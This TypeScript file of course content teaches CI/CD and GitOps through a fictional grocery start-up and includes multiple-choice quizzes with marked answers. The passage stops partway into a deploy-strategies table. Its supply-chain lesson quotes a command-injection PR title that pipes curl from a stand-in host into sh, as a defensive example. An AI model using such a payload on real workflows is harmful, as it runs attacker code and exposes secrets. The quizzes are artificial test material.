/**
 * Career-track content: CI/CD and GitOps (CL_CICD_GITOPS), Cloud & DevOps Engineer, batch CL2.
 *
 * What a cloud or DevOps engineer owns between a merged pull request and a healthy production release: a
 * pipeline designed stage by stage, GitHub Actions deploying to AWS through OIDC federation (no stored keys),
 * the supply-chain checks that stop a vulnerable or tampered build, release strategies with automated
 * rollback and migrations that survive it, and GitOps with Argo CD. It builds on Year 3's "A Pipeline, Not a
 * Person Remembering", "Three Environments, One Build", "Getting It Back Off Again", "Building the Pipeline"
 * and "What Should Stop a Deploy", on CL1's "Roles, Temporary Credentials and IAM Identity Center" (the OIDC
 * trust condition) and on the MLOps track's "CI/CD and Infrastructure for ML"; those are referred to by
 * title, not re-taught. Azure equivalents are named in a line; CL_AZURE teaches them.
 *
 * One fictional company runs through the topic: Kiranakart, a Bengaluru quick-commerce grocery start-up whose
 * orders-api runs on ECS Fargate and EKS in AWS Mumbai (ap-south-1), GitHub organisation "kiranakart". The
 * IAM OIDC provider, roles and policies, the STS call, ECR and ECS calls were run with boto3 1.43 against
 * moto 5.2 (mock AWS) and the outputs quoted are real; the notes say where moto is more lenient than AWS (it
 * does not verify the token or the trust conditions). Every GitHub Actions workflow, Argo CD and Argo Rollouts
 * manifest was parsed with PyYAML and checked for its keys; the Kustomize overlays were rendered offline with
 * `kubectl kustomize`; the DORA, canary-analysis, expand/contract (sqlite3) and workflow-linter scripts were run
 * in Python. Workflows and Argo CD were NOT run (no GitHub repository, AWS account or cluster was used). Account
 * 123456789012, the commit hashes and *.example domains are fake. No prices are quoted.
 *
 * Skill: CI_CD (the topic's only skill), so checkpoint questions need no skillKey.
 */
import { PilotBundle, PilotMcq } from './pilotUnitContent';

const mcq = (question: string, options: [string, boolean][], explanation: string): PilotMcq =>
  ({ question, options: options.map(([text, isCorrect]) => ({ text, isCorrect })), explanation });

export const TRACK_CL_CICD_GITOPS_BUNDLES: PilotBundle[] = [
  /* ── PIPELINE_DESIGN ─────────────────────────────────────────────────────────────────── */
  {
    unitCode: 'CL_CICD_GITOPS_PIPELINE_DESIGN',
    notes: `Year 3's "A Pipeline, Not a Person Remembering" and "Building the Pipeline" gave you the parts: build once, tag by
commit, cache on the lockfile, fail fast, block on a failing test. This lesson is the job one level up: you are
the engineer who designs the path from commit to production for forty developers at Kiranakart, a Bengaluru
quick-commerce start-up, and who is paged when it lies.

## Integration, delivery, deployment

- **Continuous integration**: every change merges to main several times a day and is built and tested on each
  merge. Long-lived branches are the opposite of it.
- **Continuous delivery**: every green build of main *could* go to production; a person decides when.
- **Continuous deployment**: every green build of main *does* go to production, with no human step.

Most Indian product companies run continuous delivery to production and continuous deployment to dev and
staging. Kiranakart chose delivery for production because a release during a sale's peak is a business
decision, not a technical one.

## The stages, and what each one proves

    Stage            Proves                                       Budget
    build            the code compiles and dependencies resolve   2 min
    test + lint      behaviour and style, on every PR             5 min
    package          one image, pushed once, known by digest      2 min
    scan             no known critical CVE or leaked secret       2 min
    deploy staging   the artefact starts with staging config      3 min
    verify staging   smoke tests and a few real API journeys      3 min
    promote          a person (or a rule) approves this digest    -
    deploy prod      progressive: canary, then the rest           10-30 min
    verify prod      error rate and latency against the stable    -
    record           who, what digest, when, which commit         -

Each stage must be able to say no, and say why. A stage that only ever passes is decoration; a stage that fails
for reasons nobody can read is noise that teaches people to press "re-run".

## Build once, then promote a digest

A tag such as 8d41e07 is a name; the **digest** (sha256:...) is the image itself. Kiranakart's ECR repositories
use **immutable tags**, so 8d41e07 can never be pushed twice with different contents, and the deploy steps pin the
digest. "Promote to production" therefore means one thing: make production point at the digest that passed
staging. Nothing is rebuilt, so what you tested is what you ship.

Configuration is not baked in. The same image reads its environment's settings at start-up from SSM Parameter
Store and Secrets Manager (Year 3's "Three Environments, One Build"). With CL1's account layout (separate dev,
staging and prod accounts), the images live in one registry in a shared tooling account with a repository policy
that lets the workload accounts pull, or are replicated to each account — either way the digest is the same.

## Branches and merge discipline

**Trunk-based development** — short branches, merged within a day or two, unfinished work hidden behind feature
flags — keeps integration continuous. Long-lived develop and release branches (GitFlow) push integration to the
end, where it hurts most. Two GitHub features make trunk-based safe with many developers: **required status
checks** on main (the pipeline is not advisory) and a **merge queue**, which tests each PR on top of the PRs
ahead of it, so two individually green PRs cannot break main together.

## Pipelines as shared code

Forty services should not each invent a pipeline. Kiranakart's platform team owns **reusable workflows**
(workflow_call) in a central repository, versioned with tags; a service's workflow is ten lines that call
"build-test-scan@v3" and "deploy-ecs@v3" with inputs. A fix to the scan step then reaches every service with a
version bump, and every service gets the same gates. In a monorepo, **path filters** run only the pipelines
whose code changed.

## What makes a pipeline trustworthy

- **Deterministic**: lockfiles, pinned base images, pinned actions; the same commit builds the same image.
- **Fast**: a PR is green or red in under about ten minutes, or people batch changes and stop watching.
- **Honest**: a flaky test is quarantined with an owner and a date, never silently retried until green.
- **Least privilege**: each stage gets only the identity it needs (the next two lessons).
- **Observable and auditable**: every run links to its commit, and every deploy writes a record.
- **Reversible**: the previous digest is one command or one revert away, rehearsed, not theoretical.

## Measuring it: the four keys

The DORA research programme measures delivery with four numbers. Kiranakart computed them from a month of
deploy records (dora.py, run in Python):

    deployment frequency : 2.3 per week
    lead time for changes: 48.2 h (median, first commit to production)
    change failure rate  : 20%
    time to restore      : 108 min (median)

Frequency and lead time measure speed; failure rate and restore time measure stability. The research's point is
that the best teams improve both together: small, frequent changes are easier to test and to undo. A team that
deploys weekly to "be safe" usually ends up with bigger, riskier releases. Azure DevOps Pipelines and GitHub
Actions on Azure express the same design with Azure Container Registry in place of ECR.`,
    workedExample: `**Scenario.** Kiranakart's orders-api is deployed by an engineer running a script from her laptop after a
WhatsApp message saying "staging looks fine". Two outages last quarter came from an image rebuilt on the laptop
with a newer dependency. Design the pipeline.

**1. Triggers.** Every PR: build, unit tests, lint, dependency and secret scan — required checks, merge queue on.
Every merge to main: the full path below.

**2. One artefact.** The main build pushes orders-api:<short sha> to ECR (immutable tags, scan on push) and
records the digest as the job's output. Every later stage uses that digest; no stage runs docker build again.

**3. Staging, automatically.** Deploy the digest to the staging account; run smoke tests and three API journeys
(create cart, place order, cancel order) against staging. A failure stops the run and posts to #orders-deploys.

**4. Production, by approval.** A GitHub environment "production" with two required reviewers from the orders
team and a rule that blocks approvals between 18:00 and 23:00 IST on sale days (a team convention, enforced by
the release calendar check). The approved job deploys the same digest with a canary (lesson 4).

**5. Verify and record.** Compare canary and stable error rate and p99 for ten minutes; on failure, roll back
automatically. Write a deployment record (service, digest, commit, approver, time) to the deploy log, which
also feeds the DORA numbers.

**6. Rollback drill.** Once a month, redeploy the previous digest through the same pipeline and time it.

**Why each choice.** The laptop outage came from rebuilding; building once removes it. The "looks fine" message
becomes a test that can fail. The approval is kept for production because the business wants a person to own
timing during sales, while staging gets continuous deployment so main is always proven deployable.`,
    mcqs: [
      mcq('Kiranakart\'s pipeline rebuilds the Docker image in the production job "to be safe", after staging passed. What is wrong with that?', [
        ['Production may get bits that staging never tested, since a rebuild can pull newer layers', true],
        ['Nothing is wrong, because the Dockerfile and the commit are identical in both of the jobs', false],
        ['Rebuilding is slower, but it is otherwise the more secure way to ship a production image', false],
        ['ECR rejects an image built twice from one commit, so the production job will always fail', false],
      ], 'A rebuild can resolve a newer base image or dependency, so the tested artefact and the shipped one differ — exactly the laptop outage. Same Dockerfile does not mean same bits, slowness is not the main issue, and ECR has no rule about builds per commit.'),
      mcq('Every green build of main at Kiranakart goes to staging automatically, but production needs a reviewer\'s approval. What practice is this?', [
        ['Continuous delivery to production, with continuous deployment to staging', true],
        ['Continuous deployment to production, since staging is fully automated', false],
        ['Continuous integration only, because a human is involved at some step', false],
        ['GitFlow, because production releases are cut from a separate branch', false],
      ], 'Delivery means every build can ship and a person decides when; deployment means it ships with no human step. Staging is deployed continuously, production is delivered. CI is only the merge-and-test part, and no release branch is involved.'),
      mcq('Two pull requests each pass CI on their own, but main breaks after both merge. Which GitHub feature is designed to prevent this?', [
        ['A merge queue that tests each PR on top of the ones ahead of it', true],
        ['A required review from a CODEOWNERS member on both of the PRs', false],
        ['Re-running the failed workflow on main until it eventually passes', false],
        ['A path filter so that only the files each PR touched are tested', false],
      ], 'The merge queue builds each PR against main plus the queued PRs, catching changes that conflict in behaviour. Reviews do not run the combination, re-running hides a real break, and path filters test less, not the combination.'),
    ],
    checkpoint: [
      mcq('After an incident, which record lets Kiranakart answer "what exactly is running in production" in seconds?', [
        ['A deployment record of service, image digest, commit, approver and time', true],
        ['The latest tag in ECR, since production always runs the newest image', false],
        ['The merge history of main, because every merge reaches production', false],
        ['The Dockerfile in the repository, which describes the running image', false],
      ], 'The deploy record ties production to a digest and a commit. The newest ECR tag may not be deployed, not every merge reaches production under continuous delivery, and a Dockerfile describes how to build, not what was deployed.'),
      mcq('Kiranakart\'s month shows 2.3 deploys a week and a 20% change failure rate. A manager proposes deploying monthly to cut failures. What does the DORA research suggest?', [
        ['Bigger, rarer releases tend to fail more; make changes smaller and more frequent', true],
        ['Monthly releases will roughly halve the failure rate, as there are fewer changes', false],
        ['Failure rate and deploy frequency are unrelated, so the change will not matter', false],
        ['Only lead time matters, so the frequency of deployment can be set by any team', false],
      ], 'High performers improve speed and stability together because small changes are easier to test and undo; batching makes each release riskier. Fewer releases do not mean fewer failures per change, the metrics are related, and all four keys matter.'),
      mcq('A flaky integration test fails one run in eight at Kiranakart. What should the pipeline owner do?', [
        ['Quarantine it with an owner and a date, and keep the rest of the suite blocking', true],
        ['Add an automatic retry of the whole job until the test passes, then move on', false],
        ['Make the integration suite non-blocking so that releases are not held up', false],
        ['Delete the test, since a test that fails at random tells the team nothing', false],
      ], 'Quarantine keeps the signal honest and gets the test fixed. Silent retries teach the team to ignore red, a non-blocking suite stops meaning anything, and deleting it loses coverage of whatever it was checking.'),
    ],
  },

  /* ── GHA_TO_AWS ──────────────────────────────────────────────────────────────────────── */
  {
    unitCode: 'CL_CICD_GITOPS_GHA_TO_AWS',
    notes: `CL1's "Roles, Temporary Credentials and IAM Identity Center" showed the trust condition that lets a GitHub workflow
assume an AWS role. This lesson builds the whole path for Kiranakart's orders-api: the identity provider and
roles, the workflow that tests, builds, pushes to ECR and deploys to ECS, and the version for EKS.

## A workflow in one screen

    on:            what starts it (push, pull_request, workflow_dispatch, schedule, a tag)
    permissions:   what the job's GITHUB_TOKEN may do, and whether it may ask for an OIDC token
    concurrency:   one run at a time per group; cancel-in-progress for PRs, never for deploys
    env:           values shared by the steps
    jobs:          each on its own fresh runner; needs: orders them; outputs: pass values on
      environment: a GitHub environment with its own reviewers, secrets and variables
      steps:       uses: (an action) or run: (a shell command)

Contexts fill in values at run time (\${{ github.sha }}, \${{ vars.ECR_REGISTRY }}). Checking workflows with
Python? PyYAML (YAML 1.1) reads the bare key on as the boolean True; GitHub reads it correctly.

## How the OIDC exchange works

1. A job with **permissions: id-token: write** asks GitHub's issuer (token.actions.githubusercontent.com) for a
   short-lived signed JWT. Its claims include iss, aud, **sub**, repository, ref and environment.
2. aws-actions/configure-aws-credentials sends it to STS in **AssumeRoleWithWebIdentity** with a role ARN.
3. STS checks the signature against the IAM OIDC provider, then evaluates the role's trust policy conditions.
4. STS returns temporary credentials (an ASIA... key) for the session, an hour by default. Nothing is stored.

## The sub claim decides who gets in

    Workflow situation                    sub claim
    push to main                          repo:kiranakart/orders-api:ref:refs/heads/main
    push of tag v1.4.0                    repo:kiranakart/orders-api:ref:refs/tags/v1.4.0
    pull_request event                    repo:kiranakart/orders-api:pull_request
    job with environment: production      repo:kiranakart/orders-api:environment:production

The last row surprises everyone once: when a job names an environment, the sub carries the environment instead
of the ref. Match it exactly with StringEquals where you can. A wildcard such as repo:kiranakart/* would let any
repository in the organisation — including a forgotten test repo — assume a production role.

## Creating the provider and roles (boto3, run against moto)

    iam = boto3.client("iam")
    p = iam.create_open_id_connect_provider(
        Url="https://token.actions.githubusercontent.com",
        ClientIDList=["sts.amazonaws.com"])
    iam.create_role(RoleName="gha-orders-api-deploy",
                    AssumeRolePolicyDocument=json.dumps(TRUST), MaxSessionDuration=3600)
    iam.put_role_policy(RoleName="gha-orders-api-deploy", PolicyName="deploy",
                        PolicyDocument=json.dumps(DEPLOY_POLICY))

    provider: arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com
    role: arn:aws:iam::123456789012:role/gha-orders-api-deploy
    client ids: ['sts.amazonaws.com']
    assumed: arn:aws:sts::123456789012:assumed-role/gha-orders-api-deploy/gha-run-4242
    key prefix: ASIA

One provider per account serves every repository; roles are per purpose. No thumbprint is passed: AWS documents
that it validates GitHub's issuer through its own trusted CAs, and current SDKs make the parameter optional. **moto is lenient**: it accepted the fake token
"fake.jwt.token" and did not evaluate the conditions. Real STS rejects a sub that does not match with "Not
authorized to perform sts:AssumeRoleWithWebIdentity". The trust policy of the deploy role:

    {
      "Version": "2012-10-17",
      "Statement": [{
        "Effect": "Allow",
        "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
        "Action": "sts:AssumeRoleWithWebIdentity",
        "Condition": { "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
          "token.actions.githubusercontent.com:sub": "repo:kiranakart/orders-api:environment:production" } }
      }]
    }

Its permissions: ecr:GetAuthorizationToken on "*" (that action has no resource), push actions on the one
repository ARN, ecs:RegisterTaskDefinition and DescribeTaskDefinition, ecs:UpdateService and DescribeServices on
the one service, and iam:PassRole on exactly the task and execution roles with the condition iam:PassedToService
= ecs-tasks.amazonaws.com. The build role trusts ref:refs/heads/main and can only push.

## The workflow (parsed with PyYAML, not run)

    name: orders-api-deploy
    on:
      push:
        branches: [main]
    permissions:
      contents: read
    concurrency:
      group: deploy-orders-api-production
      cancel-in-progress: false
    env:
      AWS_REGION: ap-south-1
      IMAGE: \${{ vars.ECR_REGISTRY }}/orders-api:\${{ github.sha }}
    jobs:
      build:
        runs-on: ubuntu-latest
        permissions:
          contents: read
          id-token: write
        steps:
          - uses: actions/checkout@v4
          - uses: aws-actions/configure-aws-credentials@v4
            with:
              role-to-assume: arn:aws:iam::123456789012:role/gha-orders-api-build
              aws-region: \${{ env.AWS_REGION }}
          - uses: aws-actions/amazon-ecr-login@v2
          - uses: docker/setup-buildx-action@v3
          - uses: docker/build-push-action@v6
            with:
              push: true
              tags: \${{ env.IMAGE }}
              cache-from: type=gha
              cache-to: type=gha,mode=max
      deploy:
        needs: build
        runs-on: ubuntu-latest
        environment: production
        permissions:
          contents: read
          id-token: write
        steps:
          - uses: actions/checkout@v4
          - uses: aws-actions/configure-aws-credentials@v4
            with:
              role-to-assume: arn:aws:iam::123456789012:role/gha-orders-api-deploy
              aws-region: \${{ env.AWS_REGION }}
          - id: render
            uses: aws-actions/amazon-ecs-render-task-definition@v1
            with:
              task-definition: deploy/task-definition.json
              container-name: orders-api
              image: \${{ env.IMAGE }}
          - uses: aws-actions/amazon-ecs-deploy-task-definition@v2
            with:
              task-definition: \${{ steps.render.outputs.task-definition }}
              cluster: orders-prod
              service: orders-api
              wait-for-service-stability: true

(The full file adds a test job and a curl smoke test.) The render action writes the new image into the task
definition JSON; the deploy action registers a revision and updates the service. Against moto, register_task_definition and update_service moved the service from orders-api:1 to
orders-api:2. **wait-for-service-stability** makes the job fail if the new tasks never become healthy, instead of
going green while ECS's deployment circuit breaker rolls back behind your back.

**Caching.** Buildx's type=gha cache reuses Docker layers between runs; never cache anything holding a credential.

## EKS instead of ECS

The role needs an **EKS access entry** with a namespace-scoped access policy; the job runs aws eks
update-kubeconfig, kubectl set image and kubectl rollout status. CI now holds cluster credentials — lesson 5
replaces this push with GitOps. On Azure, azure/login uses a **federated credential** with the same subject
format.`,
    workedExample: `**Scenario.** Kiranakart's catalog-api still deploys with an IAM user key stored as a repository secret.
Releases happen when a maintainer pushes a tag like v2.7.0. Replace the key, as Terraform, and close the gap the
tag trigger opens.

**1. Reuse the provider.** The account already has the GitHub OIDC provider; a second one for the same URL would
fail. Reference it with a data source.

**2. The role** (HCL parsed with python-hcl2; not applied):

    data "aws_iam_openid_connect_provider" "github" {
      url = "https://token.actions.githubusercontent.com"
    }

    resource "aws_iam_role" "catalog_release" {
      name                 = "gha-catalog-api-release"
      max_session_duration = 3600
      assume_role_policy = jsonencode({
        Version = "2012-10-17"
        Statement = [{
          Effect    = "Allow"
          Principal = { Federated = data.aws_iam_openid_connect_provider.github.arn }
          Action    = "sts:AssumeRoleWithWebIdentity"
          Condition = {
            StringEquals = { "token.actions.githubusercontent.com:aud" = "sts.amazonaws.com" }
            StringLike   = { "token.actions.githubusercontent.com:sub" = "repo:kiranakart/catalog-api:ref:refs/tags/v*" }
          }
        }]
      })
    }

**3. The gap.** StringLike with v* means anyone who can push a tag starting with v can deploy. Add a tag ruleset
in GitHub so only the release team can create v* tags. Better still, put the deploy job behind environment:
production and trust repo:kiranakart/catalog-api:environment:production with StringEquals.

**4. The workflow.** on: push: tags: ["v*"], permissions: id-token: write on the deploy job, role-to-assume set
to the new role ARN. No secret remains.

**5. Remove the old key.** Deactivate it, watch a week of releases, then delete the key and the user.

**What was not run.** The HCL parses; the trust JSON is valid; the GitHub side needs a real repository.`,
    mcqs: [
      mcq('Kiranakart\'s deploy job names environment: production, and its role trusts "repo:kiranakart/orders-api:ref:refs/heads/main". The job now fails to assume the role. Why?', [
        ['With an environment set, the sub claim carries the environment, not the ref', true],
        ['The aud claim changes to "production" whenever an environment is named', false],
        ['Environments disable OIDC tokens until a secret named AWS_ROLE is added', false],
        ['The ref needs a wildcard, refs/heads/*, because main is a protected branch', false],
      ], 'GitHub puts environment:production into sub for jobs that reference an environment, so the ref condition no longer matches. aud stays sts.amazonaws.com, environments do not need a secret for OIDC, and a branch wildcard would not match an environment-form sub anyway.'),
      mcq('A workflow\'s configure-aws-credentials step fails with "Credentials could not be loaded" before any call to AWS. The trust policy is correct. What is most likely missing?', [
        ['permissions: id-token: write on the job, so it cannot request a token', true],
        ['An AWS_SECRET_ACCESS_KEY secret, which OIDC still needs as a fallback', false],
        ['The thumbprint of GitHub\'s certificate in the workflow\'s env block', false],
        ['A cache step, since credentials are restored from the Actions cache', false],
      ], 'Without id-token: write the job cannot ask GitHub for an OIDC token, so there is nothing to exchange. OIDC needs no stored key, thumbprints live on the IAM provider (if at all), not in the workflow, and credentials are never cached.'),
      mcq('Why does the deploy role\'s policy restrict iam:PassRole with iam:PassedToService = ecs-tasks.amazonaws.com?', [
        ['So the role can hand those roles only to ECS tasks, not to any service', true],
        ['Because ECS refuses task roles unless that condition is in the policy', false],
        ['So that the GitHub runner itself can assume the task role during deploy', false],
        ['Because PassRole is a read-only action and needs a condition to write', false],
      ], 'PassRole lets a principal give a role to a service; scoping it to ECS tasks and to two role ARNs stops the pipeline from attaching a powerful role to, say, an EC2 instance or Lambda it creates. ECS does not require the condition, the runner does not assume the task role, and PassRole is not read-only.'),
    ],
    checkpoint: [
      mcq('A platform engineer proposes one trust condition, sub = "repo:kiranakart/*", for the production deploy role "to save time". What is the risk?', [
        ['Any repository in the organisation could assume the production role', true],
        ['Only forks of kiranakart repositories could assume the role at all', false],
        ['The role would stop working, because sub may not contain a wildcard', false],
        ['Nothing, since aud already limits the role to Kiranakart workflows', false],
      ], 'The wildcard matches every repository and every ref in the organisation, including test repos with weak reviews. Forks have their owner\'s name in sub, wildcards work with StringLike, and aud is the same for every GitHub workflow.'),
      mcq('In Kiranakart\'s deploy workflow, why is concurrency set with cancel-in-progress: false for the production group?', [
        ['A new run waits instead of killing a deploy that is half-way through', true],
        ['It allows two production deploys to run at once for faster releases', false],
        ['It stops the Actions cache from being evicted while a deploy is running', false],
        ['It is required whenever a job uses id-token: write and an environment', false],
      ], 'Cancelling a deploy mid-rollout can leave a service half updated; queueing is safer. Concurrency groups serialise runs rather than parallelise them, have nothing to do with caching, and are not required for OIDC.'),
      mcq('What does wait-for-service-stability: true add to the ECS deploy step?', [
        ['The job fails if the new tasks never become healthy, instead of going green', true],
        ['ECS keeps the old tasks running for ever until the job is cancelled by hand', false],
        ['The step registers the task definition twice to confirm the JSON is valid', false],
        ['It switches the deployment from rolling to blue-green with a test listener', false],
      ], 'Without waiting, the job reports success as soon as the service is updated, even if the tasks crash and the circuit breaker rolls back. It does not keep old tasks indefinitely, register twice, or change the deployment type.'),
    ],
  },

  /* ── SUPPLY_CHAIN ────────────────────────────────────────────────────────────────────── */
  {
    unitCode: 'CL_CICD_GITOPS_SUPPLY_CHAIN',
    notes: `Year 3's "What Should Stop a Deploy" said a critical, exploitable vulnerability blocks a release. This lesson
treats the pipeline itself as something attackers aim at: it holds deploy rights to production, it runs code
from hundreds of strangers (your dependencies and third-party actions), and it is often the least reviewed code
in the company.

## Where a build gets tampered with

- **Source**: a stolen developer token pushes straight to main, or an unreviewed change edits the workflow.
- **Dependencies**: a typo-squatted package (reqeusts), dependency confusion (a public package with your private
  package's name), or a real maintainer account taken over.
- **The build**: a third-party action changes under you. In March 2025 the widely used tj-actions/changed-files
  action was compromised: its version tags were moved to a malicious commit that printed runner secrets into the
  build logs of every repository using it by tag.
- **The registry**: someone overwrites a tag with a different image.
- **Deploy**: stolen long-lived cloud keys deploy whatever the attacker likes.

The **SLSA** framework (Supply-chain Levels for Software Artifacts) names these threats and grades how much a
build can be trusted; in practice its higher levels come down to builds on hardened hosted runners, with
signed provenance saying which source and workflow produced the artefact.

## The checks, and what each catches

    Check                  Tool examples                         Blocks on
    secret scanning        gitleaks, GitHub push protection      any verified secret
    dependency audit       pip-audit, npm audit, Dependabot      known CVE with a fix
    code scanning          CodeQL, Semgrep                       high-confidence findings
    IaC scanning           Checkov, tfsec (see CL_TERRAFORM)     public buckets, open SGs
    image scanning         Trivy, ECR scan on push / Inspector   CRITICAL/HIGH with a fix
    SBOM                   Syft, Buildx sbom: true               nothing - it is a record

Kiranakart's rule: block on CRITICAL or HIGH **with a fix available** (Trivy's ignore-unfixed), because a
finding nobody can fix only teaches people to bypass the gate. Accepted risks go in an ignore file with a reason,
an owner and an expiry date, reviewed like code. A scan step from the PR workflow:

    - run: pip install pip-audit && pip-audit -r requirements.txt
    - run: docker build -t orders-api:\${{ github.sha }} .
    - uses: aquasecurity/trivy-action@<full commit SHA>   # pinned, see below
      with:
        image-ref: orders-api:\${{ github.sha }}
        severity: CRITICAL,HIGH
        ignore-unfixed: true
        exit-code: "1"

An **SBOM** (software bill of materials, in SPDX or CycloneDX format) lists every package in the image. It does
not block anything; it answers "are we affected?" in minutes the next time a library like log4j makes the news.

## Signing and provenance, in outline

**Signing** lets the cluster refuse an image the pipeline did not build. With Sigstore's cosign in **keyless**
mode, the job's OIDC identity gets a short-lived certificate, the signature is recorded in a public transparency
log, and there is no private key to leak:

    permissions:
      contents: read
      id-token: write
      attestations: write
    steps:
      # ...configure-aws-credentials, amazon-ecr-login, setup-buildx...
      - id: build
        uses: docker/build-push-action@v6
        with:
          push: true
          tags: \${{ vars.ECR_REGISTRY }}/orders-api:\${{ github.sha }}
          sbom: true
      - uses: sigstore/cosign-installer@v3
      - run: cosign sign --yes "\${{ vars.ECR_REGISTRY }}/orders-api@\${{ steps.build.outputs.digest }}"
      - uses: actions/attest-build-provenance@v2
        with:
          subject-name: \${{ vars.ECR_REGISTRY }}/orders-api
          subject-digest: \${{ steps.build.outputs.digest }}
          push-to-registry: true

Sign the **digest**, never a tag. On the cluster, an admission policy (Kyverno's verifyImages or the Sigstore
policy-controller) admits only images signed by the identity of Kiranakart's deploy workflow on main. AWS Signer
with Notation is the AWS-native alternative for ECR images. None of this was run here; it needs a registry, a
cluster and GitHub's OIDC issuer.

## Hardening the workflow itself

A forty-line Python checker (lint_wf.py, run on a deliberately bad workflow) printed:

    wf/bad.yml: 7 finding(s)
      - no top-level permissions: the token gets the repository default
      - pull_request_target: runs with secrets on code from forks
      - test: self-hosted runner on pull requests
      - test: actions/checkout@v4 is pinned to a movable tag
      - test: some-org/changed-files@main follows a branch
      - test: event data interpolated into a shell command
      - test: long-lived AWS key from secrets

What each finding means:

1. **Set permissions: contents: read at the top** and grant more per job. Older repositories default the
   GITHUB_TOKEN to read-write.
2. **pull_request_target** runs in the base repository's context, with secrets. Checking out the PR's head and
   running its code there is the classic "pwn request". Use pull_request for untrusted code.
3. **Self-hosted runners** must never run code from public pull requests; when used, make them ephemeral (one
   job, then destroyed) in private subnets with a minimal instance role.
4. **Pin third-party actions to a full commit SHA** with the version as a comment, and let Dependabot (the
   github-actions ecosystem) propose updates. A tag can be moved, as tj-actions showed; a SHA cannot. The same
   checker reports v4-style tags on every line of a normal workflow, which is the honest state of most repos.
5. **Never put \${{ github.event.* }} inside run:** — a PR titled a"; curl evil.example | sh; " becomes shell
   code. Pass it through env: and quote "$TITLE".
6. **No long-lived cloud keys**: OIDC, as in the last lesson.

## Branches and environments as controls

A **ruleset** on main: pull request required, one or two approvals, CODEOWNERS review for .github/workflows/
and deploy/, required status checks, no force pushes, no bypass for admins except break-glass. The
**production environment**: required reviewers, "prevent self-review", and deployment allowed only from main.
Together they mean no single person — or single stolen token — can ship to production. Azure DevOps has the same
ideas as branch policies and environment approvals and checks.`,
    workedExample: `**Scenario.** Thursday before Kiranakart's Diwali sale, the orders-api build fails: Trivy reports a CRITICAL CVE in
the OpenSSL package of the python:3.12-slim base image, with a fixed version available. The release carries a
checkout bug fix the business wants live before the sale.

**1. Read the finding, not just the colour.** Package, installed version, fixed version, and whether the
vulnerable code path is reachable. Here the fix exists, so ignore-unfixed does not hide it, and the policy says
it blocks.

**2. Fix forward, properly.** Rebuild on the patched base image (pull the newer python:3.12-slim digest and
update the pinned digest in the Dockerfile through a PR). The pipeline scans the new image; it passes.

**3. If no fixed base were published yet.** Record an exception in .trivyignore with the CVE id, the reason ("not
reachable: no TLS server in this container"), the owner and an expiry seven days out — reviewed by security in
the PR. The exception expires; the gate does not silently weaken.

**4. What not to do.** Set exit-code to 0 "for this one release", or skip the scan job with an admin bypass.
Both remove the gate for every later release too, and nobody remembers to put it back.

**5. Afterwards.** Add Dependabot updates for the Docker base image so the patched base arrives as a PR the week
it is published, not on the day before a sale. And record the decision in the release notes: which CVE, which
base digest replaced which, and who approved — the next audit asks exactly that.`,
    mcqs: [
      mcq('Kiranakart\'s workflow uses some-org/changed-files@v45. The maintainer\'s account is compromised and the v45 tag is moved to malicious code. What would have protected the workflow?', [
        ['Pinning the action to a full commit SHA, with updates proposed by Dependabot', true],
        ['Pinning to @main instead, so the newest fixed version is always picked up', false],
        ['Adding a cache step, so the previously downloaded copy of the action is reused', false],
        ['Running the job on a self-hosted runner, which does not download marketplace actions', false],
      ], 'A commit SHA cannot be repointed, so a moved tag does not change what runs. @main follows the attacker even faster, the Actions cache does not store action code for this purpose, and self-hosted runners download actions the same way.'),
      mcq('A step runs: echo "Deploying ${{ github.event.pull_request.title }}". Why do reviewers flag it?', [
        ['A crafted PR title is substituted into the script and runs as shell code', true],
        ['PR titles are secrets, so printing one leaks it into the public build log', false],
        ['The expression is evaluated after the shell runs, so it always prints blank', false],
        ['Pull request titles are limited to ten characters inside a run block step', false],
      ], 'Expressions are substituted into the script text before the shell starts, so a title containing quotes and commands is executed. Titles are not secret, substitution happens before (not after) the shell runs, and there is no ten-character limit.'),
      mcq('Trivy reports 41 HIGH findings in a base image, 39 of them with no fixed version. Under Kiranakart\'s policy, what blocks the build?', [
        ['Only the two findings that have a fixed version available', true],
        ['All 41 findings, since HIGH severity always blocks a release', false],
        ['None of them, since only CRITICAL findings may ever block', false],
        ['Only the 39 unfixed ones, because they are the riskiest ones', false],
      ], 'The policy blocks CRITICAL/HIGH with a fix (ignore-unfixed), so the gate asks for something the team can actually do. Blocking all 41 teaches bypassing, HIGH is in scope, and unfixed findings cannot be acted on by upgrading.'),
    ],
    checkpoint: [
      mcq('Why is pull_request_target combined with checking out the PR\'s head commit dangerous on a public repository?', [
        ['Fork code then runs with the base repository\'s secrets and token', true],
        ['The checkout fails because forks cannot be fetched from that event', false],
        ['It doubles the minutes billed, since both events run for every PR', false],
        ['The PR\'s workflow file replaces the base branch\'s file for the run', false],
      ], 'pull_request_target runs in the base repository\'s context with its secrets; checking out and executing the fork\'s code hands those secrets to the PR author. The checkout works, billing is not the issue, and the workflow file comes from the base branch, which is exactly why people assume it is safe.'),
      mcq('What does keyless signing with cosign in a GitHub workflow give Kiranakart\'s cluster?', [
        ['Proof the image digest was signed by the deploy workflow\'s OIDC identity', true],
        ['A guarantee that the image contains no known vulnerabilities at all', false],
        ['Encryption of the image layers so that only the cluster can read them', false],
        ['A long-lived signing key stored safely in the repository\'s secrets', false],
      ], 'Keyless signing binds the signature to the workflow identity via a short-lived certificate, so an admission policy can require it. Signing says who built it, not that it is vulnerability-free; it does not encrypt anything; and keyless means no long-lived key exists.'),
      mcq('Which control stops one engineer from shipping their own unreviewed change to production through the pipeline?', [
        ['Required reviewers on the environment, with self-review prevented', true],
        ['A secret-scanning step that runs on every pull request to main', false],
        ['An SBOM generated for each image and stored beside the digest', false],
        ['A Trivy image scan that fails the build on CRITICAL findings', false],
      ], 'Environment reviewers with prevent-self-review need a second person to approve the deploy. Secret scanning, SBOMs and image scans protect against other threats but let an author ship their own change.'),
    ],
  },

  /* ── DEPLOY_STRATEGIES ───────────────────────────────────────────────────────────────── */
  {
    unitCode: 'CL_CICD_GITOPS_DEPLOY_STRATEGIES',
    notes: `Year 3's "Getting It Back Off Again" ranked the ways back from a bad release, and the MLOps track used shadow and
canary releases for models. This lesson is the platform engineer's version: which strategy for which service, how
to wire rollback to metrics so nobody has to be awake for it, and the two things that make rollback impossible —
an incompatible database migration and a feature you cannot switch off.

## The strategies

    Strategy     How                                      Extra capacity   Rollback          Blast radius
    recreate     stop old, start new                      none             redeploy, slow    everyone, with downtime
